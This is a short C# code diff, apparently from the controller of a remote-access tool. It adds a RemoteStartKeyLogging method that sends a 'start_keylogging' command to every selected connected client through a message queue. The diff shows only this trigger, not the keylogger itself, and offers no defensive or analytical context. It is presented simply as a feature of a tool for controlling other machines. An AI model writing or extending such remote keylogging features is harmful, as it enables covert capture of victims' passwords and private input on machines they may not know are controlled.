@@ -125,5 +125,15 @@ namespace ExternalControl
                 _messageQueue.SetMessage(m);
             }
         }
+
+        public static void RemoteStartKeyLogging(object sender, EventArgs e)
+        {
+            foreach (ConnectionTable.ClientInformation clientInformation in _connectionTable.GetChecked())
+            {
+                var p = new string[,] { { "key", "tab" } };
+                var m = new Message(p, true, "start_keylogging", clientInformation.GetName());
+                _messageQueue.SetMessage(m);
+            }
+        }
     }
 }
